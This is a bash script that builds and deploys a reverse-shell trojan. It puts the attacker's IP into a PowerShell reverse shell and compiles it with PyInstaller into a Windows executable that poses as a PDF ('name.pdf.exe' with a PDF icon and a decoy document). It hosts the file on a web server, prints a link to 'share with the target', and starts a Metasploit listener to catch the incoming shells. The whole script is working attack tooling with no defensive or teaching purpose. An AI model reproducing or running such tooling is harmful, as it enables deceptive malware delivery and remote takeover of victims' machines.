#!/bin/bash

# Ensure Wine environment variables
export WINEARCH=win32
export WINEPREFIX=/root/.wine
PY_PATH="/root/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python311-32/python.exe"

echo -e "\n\033[1;34m======================================\033[0m"
echo -e "\033[1;34m       REVSHELL DEPLOYMENT MENU       \033[0m"
echo -e "\033[1;34m======================================\033[0m"
echo "1) Full Deployment (Build Payload, Host Server, Start Listener)"
echo "2) Host & Listen (Skip Build)"
echo "3) Listener Only (Skip Build & Skip Web Server)"
read -p "[?] Select an option [1]: " DEPLOY_CHOICE
DEPLOY_CHOICE=${DEPLOY_CHOICE:-1}

# Set execution flags based on choice
DO_BUILD=false
DO_HOST=false

case $DEPLOY_CHOICE in
    1) DO_BUILD=true; DO_HOST=true ;;
    2) DO_HOST=true ;;
    3) ;;
    *) DO_BUILD=true; DO_HOST=true ;;
esac

# ---------------------------------------------------------
# 1. DYNAMIC CONFIGURATION
# ---------------------------------------------------------
# We only need IP and Name if we are building or hosting
if [ "$DO_BUILD" = true ] || [ "$DO_HOST" = true ]; then
    DEFAULT_IP=$(hostname -I | awk '{print $1}')
    read -p "[?] Enter LHOST IP (Press Enter to use default: $DEFAULT_IP): " INPUT_IP
    LHOST=${INPUT_IP:-$DEFAULT_IP}

    read -p "[?] Enter Payload Base Name (e.g., 'resume') [Default: nmap]: " INPUT_NAME
    PAYLOAD_NAME=${INPUT_NAME:-nmap}
fi

# ---------------------------------------------------------
# 2. BUILD PHASE
# ---------------------------------------------------------
if [ "$DO_BUILD" = true ]; then
    echo -e "\n\033[1;34m=== BUILDING EXECUTABLE ===\033[0m"
    echo "[+] Injecting IP ($LHOST) into rs_2026.ps1..."
    if [ -f "rs_2026.ps1" ]; then
        sed -i "s/\$core = \".*\"/\$core = \"$LHOST\"/g" rs_2026.ps1
    else
        echo "[-] Warning: rs_2026.ps1 not found! Ensure it is in the current directory."
    fi

    if [ ! -f "source/${PAYLOAD_NAME}.pdf" ]; then
        echo "[-] Error: 'source/${PAYLOAD_NAME}.pdf' does not exist!"
        exit 1
    fi

    echo "[+] Updating wrapper.py to use ${PAYLOAD_NAME}.pdf..."
    sed -i "s/pdf_path = resource_path(\".*\.pdf\")/pdf_path = resource_path(\"${PAYLOAD_NAME}.pdf\")/g" wrapper.py

    echo "[+] Compiling the PDF-frontend wrapper..."
    rm -rf build/ dist/ *.spec
    wine "$PY_PATH" -m PyInstaller --onefile --noconsole --icon="source/pdf.ico" \
    --add-data "source/${PAYLOAD_NAME}.pdf;." --add-data "rs.vbs;." \
    --name "${PAYLOAD_NAME}.pdf" wrapper.py

    if [ ! -f "dist/${PAYLOAD_NAME}.pdf.exe" ]; then
        echo -e "\n\033[1;31m[-] Build failed! Please check the PyInstaller output above.\033[0m"
        exit 1
    fi
fi

# ---------------------------------------------------------
# 3. HOSTING PHASE
# ---------------------------------------------------------
if [ "$DO_HOST" = true ]; then
    echo -e "\n\033[1;34m=== DEPLOYMENT ===\033[0m"
    echo "[+] Cleaning up port 9000..."
    fuser -k 9000/tcp > /dev/null 2>&1
    sleep 1

    if [ ! -d "dist" ]; then
        echo "[-] Error: 'dist' folder not found! You need to run a full build first."
        exit 1
    fi

    echo "[+] Starting Python Web Server in the 'dist' folder..."
    cd dist || exit
    python3 -m http.server 9000 &
    SERVER_PID=$!
    cd .. # Navigate back to root directory
    sleep 2

    echo -e "\n\033[1;32m[!] DEPLOYMENT READY\033[0m"
    echo -e "Share this link with the target: \033[1;32mhttp://$LHOST:9000/${PAYLOAD_NAME}.pdf.exe\033[0m"
fi

# ---------------------------------------------------------
# 4. LISTENER PHASE
# ---------------------------------------------------------
echo -e "\n\033[1;34m=== LISTENER ===\033[0m"
echo "[+] Cleaning up port 10037..."
fuser -k 10037/tcp > /dev/null 2>&1
sleep 1

echo "[+] Configuring Metasploit Multi-Handler..."
cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 10037
set ExitOnSession false
exploit -j -z
EOF

echo "[+] Starting Multi-Handler. (Catching raw powershell/netcat connections)"
msfconsole -q -r listener.rc

# Cleanup when MSFConsole is exited
if [ "$DO_HOST" = true ]; then
    echo -e "\n[+] Shutting down web server and cleaning up..."
    kill $SERVER_PID 2>/dev/null
else
    echo -e "\n[+] Cleaning up..."
fi
rm listener.rc
